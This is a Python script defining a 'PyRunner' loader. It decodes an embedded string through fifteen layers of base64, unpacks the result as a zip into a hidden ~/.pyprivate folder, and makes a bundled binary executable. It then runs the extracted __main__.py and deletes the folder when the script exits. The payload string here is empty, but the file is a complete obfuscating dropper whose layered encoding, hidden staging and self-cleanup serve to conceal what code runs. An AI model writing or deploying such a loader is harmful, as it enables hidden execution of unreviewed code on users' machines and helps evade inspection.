import os
import shutil
import zipfile
import subprocess
import base64
import atexit


class PyRunner:

    def __init__(self, data):
        self.home = os.path.expanduser("~")
        self.base = os.path.join(self.home, ".pyprivate")
        self.archive = os.path.join(self.base, "pkg.zip")
        self.main = os.path.join(self.base, "__main__.py")
        self.bin = os.path.join(self.base, "Pyahmed")
        self.data = data
        self.layers = 15
        atexit.register(self.cleanup)

    def setup(self):
        os.makedirs(self.base, exist_ok=True)
        decoded = self.data.encode()
        for _ in range(self.layers):
            decoded = base64.b64decode(decoded)
        with open(self.archive, "wb") as f:
            f.write(decoded)
        with zipfile.ZipFile(self.archive, "r") as z:
            z.extractall(self.base)
        if os.path.exists(self.bin):
            os.chmod(self.bin, 0o755)

    def run(self):
        try:
            subprocess.run(["python", self.main], cwd=self.base, check=True)
        except subprocess.CalledProcessError as e:
            print(e)

    def cleanup(self):
        if os.path.exists(self.base):
            shutil.rmtree(self.base, ignore_errors=True)


if __name__ == "__main__":
    code = ""
    runner = PyRunner(code)
    runner.setup()
    runner.run()
